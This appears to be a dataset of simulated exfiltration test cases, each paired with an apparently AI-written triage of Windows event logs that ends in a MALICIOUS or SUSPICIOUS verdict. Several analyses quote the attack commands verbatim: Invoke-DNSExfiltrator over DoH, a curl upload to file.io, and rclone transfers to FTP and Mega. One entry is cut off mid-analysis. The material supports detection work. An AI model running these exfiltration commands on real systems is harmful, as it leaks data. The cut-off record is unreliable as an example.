DNSExfiltration (doh),"**Analysis:**

- **Sysmon Logs:**
  - A series of processes were executed by the user `SERVER002\admin_test`. This includes multiple instances of `powershell.exe` and `conhost.exe`, which are commonly used in both legitimate and malicious activities.
  - The most concerning entry is the execution of `powershell.exe` with the command line details revealing the use of `Invoke-DNSExfiltrator`, which is a known tool for DNS data exfiltration. This is further detailed in the command executed:
    ```
    ""powershell.exe"" & {Import-Module \\\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\dnsexfil.ps1\\\"", Invoke-DNSExfiltrator -i \\\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\dnsexfil.ps1\\\"" -d target.example.com -p file -doh google -t 500}
    ```
  - The repeated execution of `wevtutil.exe` and `conhost.exe` within a short timeframe by the same user could suggest attempts to manage or query event logs possibly to cover tracks or perform administrative tasks, often seen in malware behaviour.

- **PowerShell Logs:**
  - The PowerShell logs confirm the execution of a script involving `Invoke-DNSExfiltrator`, consistent with the Sysmon logs. The `dnsexfil.ps1` script is particularly suspicious as it indicates potential data exfiltration via DNS queries to `target.example.com`.
  
- **Application Logs:**
  - The logs here do not indicate any anomalies. The entries reflect typical software protection and security product states.

**Assessment:**

The presence of a PowerShell script that runs `Invoke-DNSExfiltrator` for communicating data to an external target suggests potential malicious activity focused on data exfiltration.

- **Risk/Threat:** There is a high risk of a data breach due to the use of `Invoke-DNSExfiltrator`.
  
**Guidance:**

1. **Immediate Investigation:**
   - Isolate Server002 from the network to prevent any further data exfiltration.
   - Capture additional network logs to analyze external communications related to `target.example.com`.

2. **Forensic Analysis:**
   - Perform a forensic dump of the system memory and investigate the PowerShell command history.
   - Review and analyze any files accessed or modified around the time of the suspicious activity.

3. **Mitigation Actions:**
   - Block outbound DNS communications and specifically filter for `target.example.com`.
   - Evaluate and strengthen the access controls and audit policies on PowerShell usage.

4. **Monitoring and Alerts:**
   - Implement monitoring for high-integrity PowerShell executions and abnormal network patterns.
   - Set alerts for specific dubious PowerShell command patterns and DNS tunneling activities.

**Resolution:** MALICIOUS

Based on the investigation, logs indicate malicious activity related to DNS data exfiltration. Further, immediate action is necessary to investigate and contain potential breaches."
Exfiltration Over Alternative Protocol - HTTP,"Upon reviewing the provided Windows event logs, several points stand out, indicating potential concerns and requiring further analysis:

1. **Time Change Events (EventID 4616):**
   - The Security log shows two time change events occurring in quick succession, which can be seen as unusual because time changes frequently indicate an attempt to cover tracks or manipulate log timelines. However, no confirmatory malicious activity is linked directly to these events. It's worth investigating further why these time changes were made and ensuring that they were legitimate.

2. **Admin Privileges Use (EventID 4672):**
   - The log entries show the user ""admin_test"" receiving a list of significant privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and `SeTakeOwnershipPrivilege`. This kind of escalation generally suggests legitimate administrative tasks, but it's worth verifying the necessity and context of these privilege escalations, especially for accounts that aren't typically seen in administrative roles.

3. **Unusual PowerShell Activity:**
   - There is a PowerShell command that reads `notepad.exe` content and posts it to `http://127.0.0.1` using `Invoke-WebRequest`. This isn't inherently malicious but could be part of a data exfiltration attempt or a test script misconfigured to loop back locally. Investigating the origin and context of this script is advisable.

4. **Sysmon Events Related to System Processes and Commands:**
   - Frequent execution of ""whoami.exe"", ""hostname.exe"", and multiple command line utilities (`wevtutil.exe`) could be part of routine administrative tasks. However, when combined with other suspicious activity, this could suggest reconnaissance or suspicious administrative activity on the server.

5. **Activity Around Microsoft Edge Update Process:**
   - There are several entries related to Microsoft Edge updates. While this can be common, it’s worth confirming that these updates align with corporate policy schedules and aren't rogue installers mimicking legitimate update tasks.

**Assessing the Activities:**
- The logs contain activities that warrant closer inspection. The time adjustments and PowerShell script usage don't provide sufficient evidence of benign or malicious intent without further context but raise potential red flags. Combining the set of logs with potential audit logs and administrative records could help make a more definitive assessment.

**Resolution: SUSPICIOUS**
Based on the analysis of the logs, the resolution is marked as **SUSPICIOUS**. The noted behaviors, particularly modifications of system time, the specific PowerShell usage, and the use of extensive privileges by a test administrative account, suggest actions that don't fit typical operational patterns, indicating the need for further detailed investigation.

**Recommended Actions:**
1. Verify the legitimacy of the time change events.
2. Audit the activities of the ""admin_test"" account, focusing on the need for elevated privileges and the context of its actions.
3. Review PowerShell execution policies and scripts running on the server for legitimacy or potential configuration errors.
4. Cross-reference the Microsoft Edge update with the intended update schedule.
5. Consider deploying further monitoring or alerting mechanisms to track unusual behavior in real-time."
Exfiltration Over Alternative Protocol - ICMP,"Based on my analysis of the provided Windows event logs from System, Sysmon, Security, Windows PowerShell, and Application sources, I have noted the following observations:

1. **Time Change Events**:
   - System log and Security log indicate multiple entries around the same timestamp suggesting minor time adjustments by the process `svchost.exe`. Such adjustments are not inherently suspicious and often occur as part of regular time synchronization activities via the Windows Time Service.

2. **Process Execution**:
   - Sysmon logs indicate the execution of several standard Windows processes, including `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`. Each of these processes is operated by the user `SERVER002\admin_test`. The consistent execution user implies routine activities but warrants further scrutiny since `powershell.exe` was triggered.

3. **PowerShell Activity**:
   - Notably, a suspicious PowerShell command is executed, reading the `notepad.exe` binary as data and seemingly transmitting the data in a loop using ping requests to localhost `127.0.0.1`. This behavior is indicative of potential data exfiltration tactics or anomalous data handling using PowerShell, which stands out as peculiar.

4. **Product Updates**:
   - The Sysmon log captures Microsoft Edge updates, which appear routine and originate from legitimate Microsoft paths and users (`NT AUTHORITY\SYSTEM`), suggesting routine system maintenance or application patching activities.

5. **General Observations**:
   - No privilege escalation, hash mismatches, or unknown application executions are apparent.
   - Most of the system activities involve standard processes typically related to administrative actions or system maintenance tasks.

### Assessment:
While most of the system activity appears benign, the specific usage of PowerShell with the unusually crafted command involving looping and pinging data raises alarms. This method is often utilized for testing, debugging, or potentially malicious activities to obfuscate data handling or network behavior, warranting further investigation.

### Final Resolution:
- **SUSPICIOUS**: The logs exhibit suspicious PowerShell behavior that does not conform to typical administrative or benign usage patterns. While not definitively identified as malicious, the activity should be investigated to determine intent and to ensure it does not signify a compromise or data breach attempt.

### Guidance on Proceeding:
1. Conduct a thorough investigation of the `powershell.exe` script history and intent.
2. Verify if the activity aligns with approved administrative tasks or established scripts.
3. Review user `SERVER002\admin_test` privileges, recent activities, and validate their legitimacy.
4. Ensure the system is protected by relevant monitoring and endpoint security solutions.
5. If unfamiliar behavior, isolate and scan the system for potential malware or indicators of compromise."
C2 Data Exfiltration,"Upon reviewing the provided logs, several points stand out that require further investigation:

### Analysis:

#### Application Log:
- The entry for `Microsoft-Windows-Security-SPP` shows a typical operation related to software protection and licensure checks, which is not inherently suspicious.

#### System Log:
- The presence of the `Microsoft-Windows-Kernel-General` events related to time change with `svchost.exe` is typically normal behavior associated with time synchronization services on Windows.
- Security event 4616 logs indicate that the system time was changed; while this can be normal, frequent or unapproved time changes can be used in evasion techniques.

#### Windows PowerShell Log:
- A PowerShell process is executing commands that manipulate local files and send data via `Invoke-WebRequest` to an external endpoint (`example.com`). The creation and posting of local text files containing ""This is line $_."" indicates a potential exfiltration or test of data leaking methods. Although the network address may seem innocuous, this behavior is notably abnormal and suspicious.

#### Security Log:
- The presence of logon type 3 events (`NTLM`) for user `admin_test` from an external system (`DESKTOP-3HL5B2P`) is somewhat usual for network-based logins. However, privilege assignment events (4672) directly after a login session deserve attention, especially if these privileges are unusual for typical operations.

#### Sysmon Log:
- There is a legitimate process activity such as `wevtutil.exe`, `conhost.exe`, and system updates through `TrustedInstaller.exe`, `TiWorker.exe`, and others. Despite their legitimacy, the intense activity involving `wevtutil.exe` could be slightly warranted for monitoring as it might be indicative of log manipulation.
- The `hostname.exe` and `whoami.exe` could be a regular administrative action; however, this should be verified against normal behavior patterns.
- The suspicious PowerShell activity here matches the PowerShell logs' suspicious behavior, detailing the precise timing and user (`SERVER002\\admin_test`) involved.

### Assessment:
- **Suspicious Activity Found**: The use of PowerShell for potential data exfiltration is undeniably concerning. Even though it isn't outrightly malicious if determined benign as a part of testing or maintenance, it requires verification.
- **Privilege Use Post-Logon**: The privilege escalation following network-based logins, although automated scripts or administrative actions could prompt this, needs validation.

### Resolution:
- **Resolution**: **SUSPICIOUS**
  - The presence of potentially unauthorized data exfiltration attempts alerts us for additional inquiry. The context should be further investigated by correlating user actions, verifying necessity, approvals for time changes, and assessing whether the PowerShell script execution was approved or fits any known administrative tasks or baselines.

### Guidance on How to Proceed:
1. **PowerShell Investigation**:
   - Confirm the purpose of the script involving data transfers to `example.com`.
   - Check if there are any approved or documented activities by the user `SERVER002\\admin_test`.

2. **Privilege Investigation**:
   - Verify whether the privileges assigned are required for `admin_test`'s operational role.
   - Investigate the external connection (`DESKTOP-3HL5B2P`) making network-based logins.

3. **Monitoring and Alerts**:
   - Increase logging and alert criteria for PowerShell activities, particularly those involving network operations and unusual privilege usage.
   - Review frequency and approval process for time change events on critical servers."
Exfiltrate data HTTPS using curl windows,"Based on the provided Windows event logs, here's a detailed analysis focusing on any suspicious or anomalous behavior:

### Analysis

1. **PowerShell Activity:**
   - There is a process execution of `powershell.exe` by the user `SERVER002\admin_test`. While PowerShell is a legitimate tool, it is often used by attackers for script execution. However, there is no specific command-line activity detailed here, so this may not immediately indicate malicious behavior without additional context.

2. **Running of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`:**
   - These are all legitimate Windows binaries. `wevtutil.exe` is used for managing event logs, `conhost.exe` relates to console sessions, `whoami.exe` provides user information, and `hostname.exe` displays the server's hostname.
   - The pattern of execution and usage of these commands might indicate some form of diagnostics or log management, but without context, this isn't inherently suspicious.

3. **Usage of `cmd.exe` and `Curl.exe`:**
   - The logs show `cmd.exe` calling `curl.exe` to upload a file to `https://file.io/` using the command: `cmd.exe /c C:\Windows\System32\Curl.exe -k -F ""file=@C:\Users\ADMIN_~1\AppData\Local\Temp\file/data.002/src/artifact"" https://file.io/`.
   - This activity is suspicious. The use of `curl.exe` to upload files to an external server may indicate data exfiltration, which is a common tactic in cyber incidents.

4. **Processes run with High Integrity Level:**
   - Several processes, including `whoami.exe` and `cmd.exe`, are executed with a high integrity level. This indicates elevated privileges, which in conjunction with file uploads, could signify unauthorized data access and exfiltration attempts.

5. **Process Execution by `NT AUTHORITY\NETWORK SERVICE`:**
   - The execution of `sppsvc.exe`, `WmiPrvSE.exe`, and other system-level processes under the `NETWORK SERVICE` and `SYSTEM` accounts is expected and typically benign in the context of system operations or updates.

### Assessment

Given the above analysis, the primary concern is the usage of `curl.exe` to upload files to an external server. This activity stands out as an anomaly and is often associated with potentially malicious activity, particularly if the file contents or intent aren't documented or authorized.

1. **Indicators of Potential Data Exfiltration:**
   - The presence of a command executing `curl.exe` to upload data to an external web service is the most significant red flag in the logs, suggesting a potential data exfiltration event.

### Conclusion

- **Resolution: SUSPICIOUS**

This event log analysis reveals activity that warrants further investigation due to the potential for unauthorized data exfiltration. It's crucial to verify if the file transfer was sanctioned and part of routine operations or if it indicates an insider threat or an external compromise.

### Guidance

1. **Immediate Actions:**
   - Verify with relevant personnel if the use of `curl.exe` for file uploads is part of regular operational activity.
   - Analyze the content of the uploaded file to determine its nature and sensitivity.
   - Review access logs and permissions related to the user `SERVER002\admin_test`.

2. **Further Investigation:**
   - Conduct a thorough forensic analysis of `Server002` to explore any other indicators of compromise or lateral movement.
   - Implement monitoring for similar process activities or network connections to unauthorized or suspicious destinations.

By following through with these actions, you can confirm the nature of these activities and mitigate any potential threats."
IcedID Botnet HTTP PUT,"Upon analysis of the provided Windows event logs, several observations can be made:

### Suspicious Activities Identified

1. **Event ID 4624 & 4672 - Logon and Privilege Use:**
   - The user `admin_test` on `SERVER002` logged in with `LogonType: 3` which typically indicates a network logon. While not inherently suspicious, this logon type should be scrutinized when combined with other anomalies, especially when privileges like `SeDebugPrivilege` and `SeImpersonatePrivilege` are granted. 
   - The presence of high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others assigned to `admin_test` can be alarming if not in line with user roles.

2. **Event ID 5379 - Credential Validation:**
   - Frequent attempts to access resources with return codes indicating access issues (ReturnCode: 3221226021) suggest failed credential access or unauthorized access attempts. These entries could indicate a misconfiguration or unauthorized access attempts.

3. **Sysmon Event ID 1 - Process Creation (PowerShell Execution):**
   - A PowerShell script executed by `SERVER002\admin_test` includes a command that creates a file named `data_exfilFile.txt` and attempts to send it to `https://google.com` using `Invoke-WebRequest`. This strongly suggests data exfiltration attempts, characteristic of malicious activity, possibly associated with an attack or malware (specifically mentioning 'IcedID Botnet').

### Other Activities Noted

Exfiltration via Encrypted FTP,"Upon analyzing the provided log entries, I've identified several key points:

1. **Time Manipulation**: The security logs show multiple 4616 events where the system time is changed. While altering system time can be part of administrative tasks, it is also a common technique used by attackers to cover their tracks or to run tasks at unexpected times. The logged entries show a short time correction (`EventID 4616`), but there's no prior logging of why and how these changes were initiated. A closer look into the reason could be beneficial, although the timestamp seems to realign rather than a drastic change.

2. **Process Execution**:
   - Multiple execution of common administrative tools like `whoami.exe` and `wevtutil.exe` is noted. The running of `whoami.exe` at `10:45:23` is standard for checking user context but could be leveraged during reconnaissance activities.
   - The execution of `power shell` with a command to upload a file to an FTP server (`EventRecordID 17961`) is of significant concern. The command is designed to exfiltrate data from `C:\\temp\\data__FTP_sample.txt` to an external FTP server. The command includes actions to set credentials for FTP access, indicating unauthorized data transfer might be occurring.

3. **Privilege Escalation**:
   - The log shows event 4672 where the account `admin_test` is granted special privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These are highly privileged rights, and frequent or unnecessary granting of them should be monitored and restricted.

4. **Failed Credential Access Attempts**:
   - Several EventID 5379 logs reflect failed credential accesses, particularly targeting accounts related to ""MicrosoftAccount"". Failed access attempts can imply brute force or misconfiguration issues.

5. **Logon Events**:
   - `EventID 4624` shows successful logons, particularly focusing on a remote IP address `fe80::e3b5:5371:12a8:9c77`. Cross-check these events for any unusual or unanticipated remote access.

6. **Malware Indicators**:
   - Particularly, the powershell log events (attempted FTP exfiltration) suggest a potential malware existence or a serious security policy violation if run intentionally. It matched no routine administrative task, suggesting potential malicious activity.

Based on the analysis, while several findings could be part of regular administrative operations, the powershell command indicates unauthorized activity to data exfiltration.

**Resolution: MALICIOUS**

**Recommended Actions**:
1. Immediately investigate the origins and purposes of the detected PowerShell script. Isolate and analyze `powershell.exe` commands for accuracy on unauthorized commands.
2. Audit the `admin_test` account's recent activities and enforce minimal privilege principles.
3. Check the security posture of any hosts with recorded failed login attempts and review access policies.
4. Validate the external connections from the IP and inspect any related communication over secured networks.
5. Review and validate ongoing or past maintenance tasks that could have necessitated time adjustments or excessive rights assignment.

Proceed to review firewall, antivirus logs, and employ deeper network inspection mechanisms to prevent potential data breaches."
Exfiltration Over Alternative Protocol - FTP - Rclone,"### Detailed Analysis of the Logs

Upon thorough analysis of the Windows event logs provided, several indicators of potentially malicious activity have been identified. Here’s a structured breakdown of the evidence:

#### Sysmon Logs

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`**:
   - There are multiple entries for processes such as `wevtutil.exe` and `conhost.exe` being executed by user `SERVER002\\admin_test`. While `conhost.exe` is common when multiple console applications are running, frequent execution of `wevtutil.exe`, which is used to manage event logs, could be abused for log manipulation or evasion.

2. **Execution of Windows PowerShell**:
   - The execution of `PowerShell.exe` with command lines indicating the operation of `rclone.exe` is a significant red flag. The event with `ProcessId: 4336` shows that PowerShell was used to execute a script that calls `rclone.exe` for potentially exfiltrating data. The script includes FTP operations pointing to `ftp.dlptest.com` with an explicit username and password, suggesting data exfiltration activities.

3. **Evidence of Data Exfiltration with `rclone`**:
   - There are several entries indicating the running of `rclone.exe`, a known tool for cloud storage synchronization and file transfers, executing data exfiltration commands. Specifically, files from `C:\\Users\\Public\\Downloads\\exfil.zip` are being transferred to an FTP server.

#### Security Logs

1. **Presence of Admin Privileges**:
   - Event ID 4672 indicates special privileges were assigned to SYSTEM, which is normal, but checks should be conducted to ensure these actions align with expected administrative tasks.

2. **Credential Access Attempt (Event ID 5379)**:
   - Multiple attempts to read Windows Live credentials are logged with a return code indicating potential failure (`3221226021`). This could indicate attempts to access stored credentials or misuse of stored account information, potentially part of reconnaissance or lateral movement efforts.

#### PowerShell Logs

- The PowerShell log confirms the execution of a script intended to exfiltrate data using `rclone.exe`. This correlates with malicious activity aimed at unauthorized data extraction from the host server.

### Assessment

**Malicious** - The logs present substantial evidence of malicious activity:

1. **Data Exfiltration**: The use of `PowerShell` and `rclone.exe` for transferring data to an external FTP server is clear evidence of data exfiltration.

2. **Use of Potentially Unwanted Programs**: `wevtutil.exe` usage may suggest an attempt to cover tracks by altering event logs, which is a known tactic in evasion techniques.

3. **Possible Credential Access**: The repeated access attempts for credentials, although unsuccessful, indicate potential unauthorized attempts to gain further access or privileges.

### Guidance on How to Proceed

1. **Immediate Containment**: Disconnect the affected host (Server002) from the network to prevent further data exfiltration and to contain potentially malicious activity.

2. **Conduct a Full Forensic Analysis**: Utilize more advanced security tools to extract in-depth insights about unauthorized file access, data exfiltration paths, and any further installed payloads.

3. **Review Access Logs and Permissions**: Audit user accounts and permissions, especially focusing on `admin_test`, to ensure there are no unwanted administrative privileges granted or misconfigurations.

4. **Network and Endpoint Security Enhancements**: Implement stricter controls on data transfer tools (like `rclone`) usage within the network, and establish advanced monitoring for unusual patterns of PowerShell and external data transfers."
Exfiltrate data with rclone to cloud Storage - Mega (Windows),"After carefully analyzing the provided logs, I have observed several events that stand out due to their potentially suspicious nature:

1. **Security Log - EventID 4624**: A successful logon event is recorded with a Logon Type 5, which indicates a service logon. The process involved is `services.exe`, a typical system process, and it is logging in as `SYSTEM`, which is normal under most service scenarios. However, service logons can be abused if improperly configured scripts or services exist.

2. **Security Log - EventID 4672**: This event shows special privileges assigned to the `SYSTEM` account, including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc. These privileges are normally granted to system-level processes but could be potentially abused.

3. **PowerShell Log**: It contains scripts that create a directory and configuration for `rclone`, a legitimate tool used for file synchronization with cloud storage, but it can also be leveraged for data exfiltration if misused. The specific command-line arguments used could suggest uploading or synchronizing data to a remote location. Particularly suspicious is the presence of a cloud service configuration for a Mega account, which uses an email address (`filetesting@outlook.com`) that could be fabricated.

4. **Sysmon Log - EventID 1**: Shows multiple instances of `rclone.exe` execution from a temporary directory (`C:\Users\admin_test\AppData\Local\Temp\Externalfiles\data.002\`). The command line indicates a configuration setup for the cloud service ""Mega"" and subsequent copying of files to this cloud storage. Such activity, especially from a temporary directory, suggests unauthorized data transfer intentions.

5. **Unusual Process Executions**: Several Sysmon events record the execution of common system utilities like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `conhost.exe`, all executed in quick succession. These could be indicative of post-exploitation reconnaissance or enumeration activities.

Overall, the combination of service logons, privileged account activities, and extensive PowerShell scripting coupled with the execution of data upload via `rclone.exe` suggests potential unauthorized or malicious activities potentially aimed at data exfiltration.

### Assessment
Given the details mentioned, the activities observed, particularly involving `rclone` and the suspicious Mega account setup, represent a strong indication of data exfiltration attempts. These activities should not occur without explicit administrative authorization and review.

### Resolution
- **MALICIOUS**: The logs indicate malicious activity focused on potential data exfiltration.

### Guidance on How to Proceed
1. **Containment**: Immediately contain the affected host to prevent further data loss or exfiltration. Disconnect it from the network safely.
2. **Eradication**: Investigate how `rclone` was deployed within the system and remove any unauthorized scripts, configurations, and tools. Review user permissions, particularly those of `SERVER002\\admin_test`.
3. **Recovery**: Restore the system from a known good backup if available or rebuild the system to ensure it is clean.
4. **Monitoring and Response**: Increase monitoring across the network for similar activities, and review other systems for signs of compromise.
5. **Review and Harden Security Policies**: Ensure security policies are up-to-date to prevent such activities, including controlling the use of PowerShell and other scripting tools, implementing least privilege access, and actively monitoring high-value accounts.

Finally, conduct a thorough post-mortem to understand the breach's impact and take steps to prevent future occurrences."
Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows),"**Analysis of Windows Event Logs:**

Upon reviewing the provided Windows event logs, I have compiled the following analysis regarding suspicious or potentially malicious activities:

1. **Suspicious PowerShell Activity:**
   - A PowerShell command was executed (Event ID 600 within the Windows PowerShell log) that contains potentially harmful behavior. The command initiated by the user `admin_test` includes references to sensitive information such as ""secrets, api keys, passwords..."" being exported to a Pastebin URL. This clearly indicates data exfiltration and is a common tactic used by cyber adversaries.
   - The PowerShell command line argument reflects an `Invoke-RestMethod` to POST data to an external server, typical of a malicious data exfiltration or command-and-control (C2) activity.
   - These logs indicate malicious intent as they involve exporting sensitive information outside the corporate network.

2. **Use of Legitimate System Utilities in Suspicious Contexts:**
   - High Integrity processes such as `hostname.exe`, `whoami.exe`, and `wevtutil.exe` were executed. While these are legitimate Windows utilities, their execution in rapid succession or in combination with other activities could represent enumeration techniques commonly used by attackers during exploitation or post-exploitation phases.
   - This activity, by itself, may not be outright malicious, but in the context of the logs, it aligns with the reconnaissance and preparatory actions in a cyber-attack.

3. **Privileged Access and Anomalous Process Launches:**
   - The `admin_test` account appears to have elevated privileges as indicated by Event ID 4672 in the Security log, which enumerates sensitive privileges granted to this account. The user is operating with high integrity levels and executing commands that are often leveraged in attacks.
   - The execution of `wsmprovhost.exe` is seen spawning child processes. This can be normal, but if used in parallel with admin commands and data exfiltration, may indicate abuse.

4. **System Time Manipulations:**
   - Several entries (Event ID 1 in the System log) indicate changes in system time that do not align with standard operations. While not conclusively malicious on its own, altering system time can be indicative of efforts to manipulate logs or conduct time-based evasion tactics.

**Assessment and Resolution:**

- **Resolution: MALICIOUS**

Given the combination of the PowerShell script indicating potential data exfiltration, the sequence of process executions matching known attack patterns, and the apparent use of a compromised account (`admin_test`) operating with elevated privileges, the activities observed constitute a confirmed malicious incident.

**Threats and Risks Identified:**

- **Data Exfiltration:** The execution of the PowerShell script suggests that sensitive information may have been compromised and sent to an external source.
- **Privilege Misuse:** The privileges assigned to `admin_test` represent a significant risk if leveraged for malicious activities.
- **Internal System Compromise:** The server `Server002` may have been targeted for exploitation, enumeration, and lateral movement.

**Guidance on How to Proceed:**

1. **Isolate the Affected Host:** Immediately disconnect `Server002` from the network to prevent further unauthorized access or data exfiltration.

2. **Conduct a Full Forensic Investigation:** Perform a detailed forensic analysis on `Server002`, focusing on PowerShell Executions, network activity logs, and file integrity checks to identify the scope of the breach.

3. **Audit and Secure Credentials:** Investigate the credentials associated with `admin_test`, enforce a change to any compromised passwords, and consider implementing multi-factor authentication (MFA).

4. **Review and Patch Security Vulnerabilities:** Ensure that the host and network have no outstanding vulnerabilities. Update all systems with the latest security patches.

5. **Communicate with Affected Parties:** If sensitive data has been exfiltrated, communicate with relevant stakeholders and, if necessary, comply with breach notification regulations."
Exfiltration Over Alternative Protocol - SMTP,"### Detailed Analysis:

Upon reviewing the provided Windows event logs closely, I identified the following key points of interest:

#### 1. Use of PowerShell:
- **Event ID 1 (Sysmon)**: A PowerShell command was executed with the command line: `\""powershell.exe\"" & {Send-MailMessage -From test@corp.com -To test@corp.com -Subject \""data.003 file Test\"" -Attachments C:\\Windows\\System32\\notepad.exe -SmtpServer 127.0.0.1}`. This indicates an attempt to send an email with an attachment (`notepad.exe`) using the `Send-MailMessage` cmdlet. The use of PowerShell for sending an email with an attachment like `notepad.exe` is highly unusual and could suggest a potential attempt to exfiltrate data or leverage a legitimate file to disguise an attack.

#### 2. Execution of Windows Utilities:
- **Whoami and Hostname**: Regular execution of `whoami.exe` and `hostname.exe` is observed. These are standard Windows utilities used to display the current user and computer name, respectively. While they indicate a user is checking their credentials/environment, if used in malicious scripts or context, it could be part of the reconnaissance phase of an attack.

#### 3. Use of `wevtutil.exe`:
- **Event IDs 5 (Sysmon)**: Multiple processes of `wevtutil.exe` and `conhost.exe` are periodically spawned. While `wevtutil` is a command-line utility for managing event logs, malicious actors sometimes use it to clear event logs to cover their tracks. However, there's no indication that these were used maliciously in the given logs.

#### 4. Kernel Time Change:
- **Event ID 4616 (Security), Events 1 & 24 (System)**: There is evidence of a system time change. Such actions can be indicative of attempts to disrupt the chronological integrity of logs, potentially hiding or altering the timeline of malicious activity. The source process identified is `svchost.exe`, which is commonly used by Windows processes, but can also be used in attacks.

### Assessment:
- **Suspicious PowerShell command**: The use of PowerShell to send an email with an attached executable file is suspicious and indicative of potential malicious activity. This command is executed under a context (`admin_test`) and should trigger further investigation.
- **System time manipulation**: Changing the system time without correlating system maintenance records raises a flag and may require further checks against corresponding expected changes or anomalies in operations.

### Threats and Risks Identified:
1. **Potential Data Exfiltration**: The PowerShell command could potentially be used for data exfiltration.
2. **Timeline Obfuscation**: Adjustments to the system time could risk log integrity, allowing malicious actions to be concealed.

### Guidance on How to Proceed:
1. **Conduct a Thorough Investigation**:
   - Query whether the PowerShell command was authorized and its purpose.
   - Verify the integrity and necessity of email communication using PowerShell.
   - Ensure that no additional modifications to logs or other suspicious behavior occurred in the larger context.
   
2. **Review User Activity**: Check other activities associated with the `admin_test` user, especially any attempts to access sensitive data or systems.

3. **Perform a Detailed Threat Hunt**: Given the potential signs of PowerShell abuse and time manipulation, extend investigation to other systems for such activity signatures.

4. **Strengthen Monitoring and Alerts**: Reinforce monitoring around PowerShell executions, particularly those involving attachment of executables. Implement alerts for time change events and unauthorized log manipulations.

5. **Audit and Remediate Security Posture**: Enforce strong operational controls and security measures, like disabling unnecessary PowerShell capabilities and improving audit processes for time changes and application execution.

### Final Resolution:
- **SUSPICIOUS**: The activity observed in the logs is suspicious and warrants further investigation to rule out or confirm malicious intent and ensure no broader compromise within the network ecosystem."
Text Based Data Exfiltration using DNS subdomains,"Upon analyzing the provided logs, the following observations and assessments were made:

### Analysis

**Unusual Use of PowerShell:**
- A PowerShell command was executed with intent to exfiltrate data. It used variables like `$dnsServer`, `$exfiltratedData`, and `$chunkSize` to manipulate data into chunks, encode it with Base64, and perform DNS queries (`Resolve-DnsName`) with portions of the data. This behavior is often associated with stealth exfiltration using DNS tunneling, a common tactic in malicious data exfiltration campaigns.
- Evidence of this activity is found consistently across the Sysmon and Windows PowerShell logs, where `powershell.exe` is shown running the described script.

**System Time Modification:**
- Security and System event logs indicate time adjustments on the system. Events like EventID 4616 suggest suspicious alterations to the system clock's time, which might be indicative of an attempt to obfuscate activity by skewing the timeline of the logs.

**Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
- The frequent execution of `wevtutil.exe` (which is used to extract logs from the system) with `conhost.exe` could be benign if used for legitimate administration. However, in conjunction with the PowerShell script and time-altering changes, it raises suspicion of a possible attempt to delete or alter logs for covering tracks.

**BENIGN Observations:**
- Legitimate and regularly scheduled processes were observed, such as `svchost.exe`, `MicrosoftEdgeUpdate.exe`, and processes related to regular system maintenance and updates.
- These processes appear normal and are part of the usual operations of a Windows OS.

### Assessment
Based on the analysis:

- **MALICIOUS** activity has been detected. The use of PowerShell to execute scripts that appear engineered for data exfiltration via DNS tunneling signifies a likely compromise. This activity is further compounded by the tampering of system time, which typically is leveraged to evade detection or create confusion in log records.

### Recommendations
1. **Immediate Containment:**
   - Disconnect the affected host (Server002) from the network to prevent further data exfiltration or interaction with command-and-control servers.
   
2. **Thorough Investigation:**
   - Conduct a detailed forensic investigation on Server002 to identify any compromised accounts, execute data recovery processes, and determine the extent of the exfiltration.
   
3. **Review and Revise Security Measures:**
   - Investigate potential security gaps that allowed this infiltration. Consider enhancing script execution policies, PowerShell logging, and DNS query monitoring.
   
4. **Patch Management and Review Credentials:**
   - Ensure all systems are up-to-date with the latest security patches. Review all administrative user accounts for suspicious additions or changes.

5. **Advanced Monitoring:**
   - Implement advanced monitoring for unusual DNS query patterns and PowerShell script blocking using AppLocker or equivalent policy settings.

Overall, there are substantial signs of unauthorized and malicious activity within the logs, necessitating prompt action as outlined."
MAZE FTP Upload,"Upon analyzing the provided logs, several observations and points of interest arise:

### Anomalous and Suspicious Behavior:

1. **Windows Time Manipulation:**
   - The security logs, system logs, and kernel general logs show a change in system time (EventID 4616 and EventID 1), where the time was set back from 15:50:20 to 15:49:53. This kind of activity may indicate an attempt to manipulate time for various reasons, often seen in malicious scenarios to revert changes or cover tracks.

2. **PowerShell Activity:**
   - There is a suspicious PowerShell execution (EventRecordID 17964 and EventRecordID 1049) that attempted to upload `.7z` archives from the `%windir%\temp` directory to a local FTP server at `127.0.0.1`. The command used powershell scripts to test connection and upload files if connectivity was established. Such PowerShell scripts are not standard and could be indicative of data exfiltration attempts.

3. **Unusual Process Execution:**
   - The frequent execution of administrative tools such as `wevtutil.exe` and `conhost.exe` by the user `admin_test` with high integrity levels seems excessive and warrants further investigation. These tools can potentially be used maliciously to clear event logs or interact with system console windows, respectively.

4. **System Services Execution:**
   - Legitimate system services like `svchost.exe`, `wsmprovhost.exe`, and `sppsvc.exe` were observed running with expected privileges. However, they often appear in conjunction with malicious behaviors as attackers might use these processes as cover for lateral movement or privilege escalation.

5. **Concurrent Execution Timelines:**
   - The events are very closely timed around `15:50`, especially the execution of `wevtutil.exe` and `conhost.exe`. This rapid sequence might indicate automated actions, such as scripts executed by malicious actors.

### Assessment of the Situation:

Based on the logs, there are clear indicators of suspicious activities:
- System time manipulation
- Suspicious PowerShell activity for uploading files to FTP
- Frequent execution of administrative and logging management processes

### Threat/Risk Identified:

1. Potential data exfiltration attempt through PowerShell scripting using FTP.
2. Possible attempts to cover logs or perform recon actions via `wevtutil.exe` and other system binaries.
3. System time manipulation, which might be an attempt to disrupt logging or auditing systems.

### Guidance and Resolution:

1. **Conduct Thorough Investigation:**
   - Examine file modifications and network access logs around `15:50` to identify potential malicious script sources or uploaded data.
   - Investigate the legitimacy of `admin_test` actions and privileges, checking the origin of the connection or script executions, and if this user account is compromised.
   - Look for patterns that indicate post-exploitation or persistence mechanisms.

2. **Containment and Remediation:**
   - If unauthorized actions are confirmed, isolate the host to prevent potential lateral movement across the network.
